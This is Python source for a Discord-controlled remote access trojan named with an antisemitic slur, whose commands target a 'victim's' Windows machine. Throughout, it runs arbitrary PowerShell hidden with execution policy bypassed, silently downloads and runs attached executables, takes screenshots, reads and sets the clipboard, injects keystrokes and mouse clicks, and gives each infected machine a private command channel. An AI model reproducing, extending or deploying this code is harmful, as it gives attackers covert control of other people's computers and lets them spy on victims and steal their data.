# JewFuss-Lite, a limited version of JewFuss-XT for a more light weight experince
from discord.ext import commands
from PIL import Image, ImageDraw
import subprocess
import pyautogui
import PyElevate
import pyperclip
import datetime
import platform
import asyncio
import discord
import getpass
import hashlib
import base64
import psutil
import shutil
import signal
import time
import uuid
import mss
import sys
import wmi
import io
import os
import re

TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
version = "1.0.0.0" # Replace with current JewFuss-Lite version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g

FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='$', intents=intents)
bot.remove_command('help')
pyautogui.FAILSAFE = False

async def fm_send(ctx, content: str, alt_content: str = None, filename: str = "output.txt", header=""):
    if len(content) > 2000:
        buf = io.BytesIO((alt_content or content).encode("utf-8"))
        await ctx.send(header, file=discord.File(fp=buf, filename=filename))
    else:
        await ctx.send(header + content)

async def fm_reply(ctx, content: str, alt_content: str = None, filename: str = "output.txt", header=""):
    if len(content) > 2000:
        buf = io.BytesIO((alt_content or content).encode("utf-8"))
        await ctx.reply(header, file=discord.File(fp=buf, filename=filename))
    else:
        await ctx.reply(header + content)

commands.Context.fm_send = fm_send
commands.Context.fm_reply = fm_reply

@bot.command(help="Updates JewFuss using the attached .exe file. (Must be a compiled installer, not a direct JewFuss executable)", usage="$update")
async def update(ctx):
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("You don't have permission to access this command.")
        return
    if not ctx.message.attachments:
        await ctx.send("No file attached. Please attach a `.exe` file.")
        return

    attachment = ctx.message.attachments[0]
    if not attachment.filename.lower().endswith(".exe"):
        await ctx.send("Attached file must be a `.exe`.")
        return

    try:
        save_path = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), attachment.filename)
        await attachment.save(save_path)

        prevpath = os.path.abspath(sys.argv[0])
        
        creationflags = (0x08000000 | 0x00000200)
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        subprocess.Popen(
            [save_path, f"--prevpath={prevpath}"],
            creationflags=creationflags,
            startupinfo=si,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            close_fds=True,
            shell=False
        )

        await ctx.send(f"Updater `{attachment.filename}` has been downloaded and executed.")
    except Exception as e:
        await ctx.send(f"Could not process the update. {e}")
        
@bot.command(help="Checks if the victims device is up.", usage="$ping")
async def ping(ctx):
    await ctx.send("Pong!")

@bot.command(help="Shows victims device status including uptime, resource usage, etc.", usage="$status")
async def status(ctx):
    global version
    
    if True:
        # ── Names
        dev_name = platform.node()
        user_name = getpass.getuser()

        # ── Uptime (System & Bot)
        boot_time = psutil.boot_time()
        system_uptime = time.time() - boot_time
        program_uptime = time.time() - psutil.Process(os.getpid()).create_time()

        def format_duration(seconds):
            m, s = divmod(int(seconds), 60)
            h, m = divmod(m, 60)
            d, h = divmod(h, 24)
            return f"{d}d {h}h {m}m {s}s"

        # ── CPU & RAM Usage
        cpu_usage = psutil.cpu_percent(interval=1)
        proc = psutil.Process(os.getpid())
        rat_cpu = proc.cpu_percent(interval=1)
        rat_mem = proc.memory_info().rss / (1024**2)
        total_mem = psutil.virtual_memory().total / (1024**2)

        # ── Script Location
        script_path = os.path.abspath(sys.argv[0])

        # ── Embed
        embed = discord.Embed(
            title=f"`{dev_name}/{user_name}` Status",
            color=discord.Color.blue()
        )
        
        if ctx.author.guild_permissions.administrator:
            embed.add_field(name="Script Location", value=f"`{script_path}`", inline=False)
        embed.add_field(name="RAT Memory Usage", value=f"`{rat_mem:.2f}/{total_mem:.0f} MB`", inline=True)
        embed.add_field(name="RAT CPU Usage", value=f"`{rat_cpu}%`", inline=True)
        embed.add_field(name="System Uptime", value=f"`{format_duration(system_uptime)}`", inline=False)
        embed.add_field(name="Bot Uptime", value=f"`{format_duration(program_uptime)}`", inline=False)
        embed.add_field(name="System CPU Usage", value=f"`{cpu_usage}%`", inline=False)
        embed.add_field(name="Version", value=f"`{version}`", inline=False)
        await ctx.send(embed=embed)

def check_permissions(file_path):
    permissions = {
        'read': os.access(file_path, os.R_OK),
        'write': os.access(file_path, os.W_OK),
        'execute': os.access(file_path, os.X_OK),
        'delete': os.access(file_path, os.W_OK)
    }
    return permissions

async def terminate_process(proc: subprocess.Popen, ctx):
    try:
        try:
            proc.send_signal(signal.CTRL_BREAK_EVENT)
        except Exception:
            proc.terminate()
        for _ in range(30):
            if proc.poll() is not None:
                return
            await asyncio.sleep(0.05)
        proc.kill()
    except Exception as e:
        await ctx.send(f"Error executing command: {e}")

@bot.command(help="Runs a command in PowerShell and streams output live", usage="$ps <command>")
async def ps(ctx, *, command: str = None):
    if not command or not command.strip():
        await ctx.send("Command cannot be empty.")
        return

    try:
        ps_exe = shutil.which("pwsh") or shutil.which("powershell") or "powershell"
        ps_boot = "[Console]::OutputEncoding = New-Object System.Text.UTF8Encoding($false); $OutputEncoding = [Console]::OutputEncoding;"
        ps_cmd = [
            ps_exe,
            "-NoLogo",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-WindowStyle", "Hidden",
            "-NonInteractive",
            "-Command", f"{ps_boot}; & {{ {command} }} 2>&1"
        ]

        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0

        creation = 0
        if hasattr(subprocess, "CREATE_NO_WINDOW"):
            creation |= subprocess.CREATE_NO_WINDOW
        if hasattr(subprocess, "CREATE_NEW_PROCESS_GROUP"):
            creation |= subprocess.CREATE_NEW_PROCESS_GROUP

        process = subprocess.Popen(
            ps_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            text=True,
            encoding="utf-8",
            errors="replace",
            startupinfo=si,
            creationflags=creation
        )

        thread = None
        watcher_task = None
        thread_deleted = False
        first_output = None
        pending = []
        pending_len = 0
        MAX_MSG = 1900
        FLUSH_INTERVAL = 0.7
        last_flush = time.monotonic()

        async def ensure_thread():
            nonlocal thread, watcher_task
            if thread is None:
                current_datetime = datetime.datetime.now().strftime("-%S")
                base = (command or "")[:100 - len(current_datetime)]
                name = f"{base}{current_datetime}" or "ps-output"
                if first_output and len(f"**Output:**\n{first_output}") <= 2000:
                    msg = await ctx.send(f"**Output:**\n{first_output}")
                else:
                    buf = io.BytesIO((f"**Output:**\n{first_output}" if first_output else "**Output:**").encode("utf-8"))
                    msg = await ctx.send(file=discord.File(fp=buf, filename="command_output.txt"))
                thread = await msg.create_thread(name=name)

                async def watch_thread_delete():
                    nonlocal thread_deleted
                    try:
                        await bot.wait_for("thread_delete", check=lambda t: t.id == thread.id)
                        thread_deleted = True
                        await terminate_process(process, ctx)
                    except Exception:
                        pass

                watcher_task = asyncio.create_task(watch_thread_delete())

        async def try_send(to_send: str | None, *, as_file_name: str | None = None):
            nonlocal thread_deleted
            try:
                await ensure_thread()
                if thread_deleted:
                    return False
                if as_file_name:
                    data = io.BytesIO(to_send.encode("utf-8"))
                    await thread.send(file=discord.File(fp=data, filename=as_file_name))
                else:
                    await thread.send(to_send)
                return True
            except (discord.NotFound, discord.Forbidden):
                thread_deleted = True
                await terminate_process(process, ctx)
                return False

        async def flush(force=False):
            nonlocal pending, pending_len, last_flush, thread_deleted
            if thread_deleted or not pending:
                return
            if not force and (time.monotonic() - last_flush) < FLUSH_INTERVAL and pending_len < MAX_MSG:
                return
            chunk = "\n".join(pending)
            ok = True
            if len(chunk) > 2000:
                ok = await try_send(chunk, as_file_name="command_output.txt")
            else:
                ok = await try_send(chunk)
            pending.clear()
            pending_len = 0
            last_flush = time.monotonic()
            if not ok:
                return

        while True:
            if thread_deleted:
                break
            line = process.stdout.readline()
            if line == "" and process.poll() is not None:
                break
            if not line:
                await asyncio.sleep(0.02)
                await flush()
                continue

            s = line.rstrip("\r\n")
            if not s:
                continue

            if first_output is None:
                first_output = s
                continue

            if len(s) > 2000:
                await try_send(s, as_file_name="line_output.txt")
                if thread_deleted:
                    break
                continue

            pending.append(s)
            pending_len += len(s) + 1
            if pending_len >= MAX_MSG:
                await flush(force=True)
            elif (time.monotonic() - last_flush) >= FLUSH_INTERVAL:
                await flush()

        if not thread_deleted and first_output and thread is None:
            await ctx.send(f"**Output:**\n{first_output}")

        if not thread_deleted:
            await flush(force=True)

        if watcher_task:
            watcher_task.cancel()

    except Exception as e:
        await ctx.send(f"Error executing command: {e}")

def compressed_device_id():
    uuid_raw = wmi.WMI().Win32_ComputerSystemProduct()[0].UUID
    return base64.b32encode(uuid.UUID(uuid_raw).bytes).decode().rstrip("=").lower()

@bot.command(help="Delete and recreate bot's channel, wiping all messages, and channel permssions", usage="$init [/f]")
async def init(ctx):
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("You don't have permission to initialize this channel.")
        return

    category_name = f"_{re.sub(r'[^a-zA-Z0-9_-]', '', os.environ.get('COMPUTERNAME', 'UnknownDevice'))}-{compressed_device_id()}"
    channel_name = re.sub(r'[^a-zA-Z0-9_-]', '', os.getlogin()).lower()

    category = discord.utils.get(ctx.guild.categories, name=category_name)

    if category is None:
        category_overwrites = {
            ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
            ctx.guild.me: discord.PermissionOverwrite(read_messages=True) 
        }
        category = await ctx.guild.create_category(category_name, overwrites=category_overwrites)

    existing_channel = discord.utils.get(category.text_channels, name=channel_name)

    if ctx.message.content.endswith("/f"):
        if existing_channel:
            await existing_channel.delete()
        new_channel = await ctx.guild.create_text_channel(channel_name, category=category, overwrites=category.overwrites)
        await new_channel.send(f"Channel wiped by {ctx.author.mention}.")
    else:
        if existing_channel:
            await ctx.send("Channel already exists. Run `$init /f` to wipe the channel.")
        else:
            new_channel = await ctx.guild.create_text_channel(channel_name, category=category, overwrites=category.overwrites)
            await new_channel.send(f"Bot channel created by {ctx.author.mention}.")

@bot.event
async def on_guild_join(guild):
    category_name = f"_{re.sub(r'[^a-zA-Z0-9_-]', '', os.environ.get('COMPUTERNAME', 'UnknownDevice'))}-{compressed_device_id()}"
    channel_name = re.sub(r'[^a-zA-Z0-9_-]', '', os.getlogin()).lower()

    category = discord.utils.get(guild.categories, name=category_name)
    
    if category is None:
        category_overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        category = await guild.create_category(category_name, overwrites=category_overwrites)

    existing_channel = discord.utils.get(category.text_channels, name=channel_name)

    if existing_channel is None:
        new_channel = await guild.create_text_channel(channel_name, category=category, overwrites=category.overwrites)
        await new_channel.send(f"Bot has joined! Please run `$init` in this channel to get started.")

@bot.event
async def on_ready():
    in_server_amount = 0
    logon_date = datetime.datetime.now().strftime("Latest logon: %m/%d/%Y %H:%M:%S") + f" (UTC{'-' if (offset := (time.altzone if time.localtime().tm_isdst else time.timezone) // 3600) < 0 else '+'}{abs(offset)})"

    for guild in bot.guilds:
        category_name = f"_{re.sub(r'[^a-zA-Z0-9_-]', '', os.environ.get('COMPUTERNAME', 'UnknownDevice'))}-{compressed_device_id()}"
        channel_name = re.sub(r'[^a-zA-Z0-9_-]', '', os.getlogin()).lower()

        category = discord.utils.get(guild.categories, name=category_name)
        
        if category is None:
            category_overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                guild.me: discord.PermissionOverwrite(read_messages=True)
            }
            category = await guild.create_category(category_name, overwrites=category_overwrites)

        existing_channel = discord.utils.get(category.text_channels, name=channel_name)
        
        if existing_channel is None:
            new_channel = await guild.create_text_channel(channel_name, category=category, overwrites=category.overwrites)
            await new_channel.edit(topic=logon_date)
            await new_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands. {' (Ran as admin)' if PyElevate.elevated() else ''}")
        else:
            await existing_channel.edit(topic=logon_date)
            await existing_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands. {' (Ran as admin)' if PyElevate.elevated() else ''}")
        in_server_amount += 1

    print(f'Bot logged in as "{bot.user.name}" on {in_server_amount} server(s)')
    
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    expected_category = f"_{re.sub(r'[^a-zA-Z0-9_-]', '', os.environ.get('COMPUTERNAME', 'UnknownDevice'))}-{compressed_device_id()}"
    expected_channel = re.sub(r'[^a-zA-Z0-9_-]', '', os.getlogin()).lower()
    actual_category = message.channel.category.name if message.channel.category else None
    
    if actual_category != expected_category or message.channel.name != expected_channel:
        return  

    await bot.process_commands(message)

@bot.command(aliases=["mpos", "pos"], help="Move cursor to defined x and y pixel coordinates on victim's device. based on only the primariy display.", usage="$setpos <x> <y>")
async def setpos(ctx, x: int, y: int):
    try:
        pyautogui.moveTo(x, y)
        await ctx.send("Cursor position set successfully.")
    except Exception as e:
        await ctx.send(f"Error setting cursor position: {str(e)}")

@bot.command(help="Simulate left mouse click on victim's device.", usage="$lclick")
async def lclick(ctx):
    try:
        pyautogui.click(button='left')
        await ctx.send("Left click executed successfully.")
    except Exception as e:
        await ctx.send(f"Error executing left click: {str(e)}")

@bot.command(help="Simulate middle mouse click on victim's device.", usage="$mclick")
async def mclick(ctx):
    try:
        pyautogui.click(button='middle')
        await ctx.send("Middle click executed successfully.")
    except Exception as e:
        await ctx.send(f"Error executing middle click: {str(e)}")

@bot.command(help="Simulate right mouse click on victim's device.", usage="$rclick")
async def rclick(ctx):
    try:
        pyautogui.click(button='right')
        await ctx.send("Right click executed successfully.")
    except Exception as e:
        await ctx.send(f"Error executing right click: {str(e)}")

@bot.command(help="Press a hotkey on victim's device. Available keys: https://bit.ly/3ya6vKg.", usage="$hotkey <keys ('btn+btn'/'btn btn')>")
async def hotkey(ctx, *, keys: str = ""):
    try:
        if not key or key == "":
            await ctx.send("Key not provided. Available keys: https://bit.ly/3ya6vKg.")
            return

        k = keys.replace("+", " ").split()
        pyautogui.hotkey(*k)
        await ctx.send(f"Pressed hotkey: `{'+'.join(k)}`")
    except Exception as e:
        await ctx.send(f"Error: `{e}`")

@bot.command(aliases=["press"], help="Press a key/hotkey on victim's device. Available keys: https://bit.ly/3ya6vKg", usage="$key <key(s)>")
async def key(ctx, *, key: str = ""):
    try:
        if not key or key == "":
            await ctx.send("Key not provided. Available keys: https://bit.ly/3ya6vKg.")
            return
        
        keys = key.replace("+", " ").split()
        if len(keys) == 1:
            pyautogui.press(key)
            await ctx.send(f"Pressed key: `{key}`")
        
        elif len(keys) < 1:
            await ctx.send("Key not provided. Available keys: https://bit.ly/3ya6vKg.")
            return
        
        else:
            pyautogui.hotkey(*keys)
            await ctx.send(f"Pressed hotkey: `{'+'.join(keys)}`")
        
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(aliases=["get_clipboard"], help="Get victims clipboard.", usage="$get_clipboard")
async def getclipboard(ctx):
    try:
        await ctx.send(f"Current clipboard: ```{pyperclip.paste()}```")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")
        
@bot.command(aliases=["set_clipboard"], help="Copy given text to victims clipboard.", usage="$set_clipboard <text>")
async def setclipboard(ctx, *, text: str):
    try:
        pyperclip.copy(text)
        await ctx.send(f"Copied to clipboard")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")   

@bot.command(help="Takes a screenshot of the victim's screen including cursor location. Optionally accepts a display index (default 0 for the full desktop).", usage="$ss [displayNum|0 (default/all)]")
async def ss(ctx, display_index: int = 0):
    try:
        with mss.mss() as sct:
            monitors = sct.monitors
            if display_index < 0 or display_index >= len(monitors):
                available = ", ".join(str(i) for i in range(len(monitors)))
                await ctx.send(f"Invalid display index provided. Available displays: {available}")
                return

            monitor = monitors[display_index]
            sct_img = sct.grab(monitor)
            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
            cursor = pyautogui.position()
            relative_cursor = (cursor[0] - monitor["left"], cursor[1] - monitor["top"])
            draw = ImageDraw.Draw(img)
            x, y = relative_cursor
            draw.ellipse((x-5, y-5, x+5, y+5), fill=(255, 0, 0))
            
            buffer = io.BytesIO()
            img.save(buffer, format='PNG')
            buffer.seek(0)
            await ctx.send("Command Executed! (Red dot indicates cursor)", file=discord.File(fp=buffer, filename="screenshot.png"))
    except Exception as e:
        await ctx.send(f"Error executing screenshot command: {str(e)}")
                
@bot.command(help="Types the given text on the victim's system.", usage="$write <text>")
async def write(ctx, *, text: str):
    try:
        pyautogui.write(text)
        await ctx.send("Command Executed!")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Gets description of a specific command", usage="$help <command>")
async def help(ctx, command_name: str):
    command = bot.get_command(command_name)
    if command:
        embed = discord.Embed(
            title=f"Help: {command_name}",
            description=command.help if command.help else "No description provided",
            color=0x007BFF
        )
        await ctx.send(embed=embed)
    else:
        await ctx.send(f"Command '{command_name}' not found.")

@bot.command(help="List bot commands in alphabetical order", usage="$commands")
async def commands(ctx, page: int = 1):
    per_page = 10
    commands_list = list(bot.commands)
    commands_list.sort(key=lambda cmd: cmd.name)

    max_page = (len(commands_list) - 1) // per_page + 1
    if page < 1 or page > max_page:
        await ctx.send(f"Page {page} is out of range. Please provide a page number between 1 and {max_page}.")
        return

    def render_page(page_num: int):
        start = (page_num - 1) * per_page
        end = start + per_page
        page_cmds = commands_list[start:end]

        embed = discord.Embed(title="Available Commands", description="List of all commands", color=0x007BFF)
        for cmd in page_cmds:
            primary = cmd.name
            aliases = list(cmd.aliases) if getattr(cmd, "aliases", None) else []
            title = ", ".join(dict.fromkeys([primary] + aliases))

            parts = []
            if getattr(cmd, "usage", None):
                parts.append(f"`{cmd.usage}`")
            if getattr(cmd, "help", None):
                parts.append(cmd.help)

            value = "\n".join(parts)
            if value:
                embed.add_field(name=title, value=value, inline=False)

        embed.set_footer(text=f"Page {page_num}/{max_page}")
        return embed

    embed = render_page(page)
    message = await ctx.send(embed=embed)

    if max_page > 1:
        await message.add_reaction("◀️")
        await message.add_reaction("▶️")

        def reaction_check(reaction, u):
            return (
                u == ctx.author
                and str(reaction.emoji) in ("◀️", "▶️")
                and reaction.message.id == message.id
            )

        while True:
            try:
                reaction, u = await bot.wait_for("reaction_add", timeout=120, check=reaction_check)
                if str(reaction.emoji) == "◀️" and page > 1:
                    page -= 1
                elif str(reaction.emoji) == "▶️" and page < max_page:
                    page += 1

                await message.edit(embed=render_page(page))
                try:
                    await message.remove_reaction(reaction.emoji, u)
                except Exception as e:
                    print(e)
            except asyncio.TimeoutError:
                break

@bot.command(help="Force stops the bot.", usage="$estop")
async def estop(ctx):
    if ctx.author.guild_permissions.administrator:
        await ctx.send("Force stopping bot...")
        await bot.close()
        os._exit(0)
    else:
        await ctx.send("You don't have permissions to do this.")

try:
    bot.run(TOKEN, reconnect=True)
except discord.errors.LoginFailure:
    exit("\n\033[91mError: Invalid bot token.\033[0m")
except KeyboardInterrupt:
    exit("\n\033[91mExiting...\033[0m")
    bot.close()
    sys.exit(0)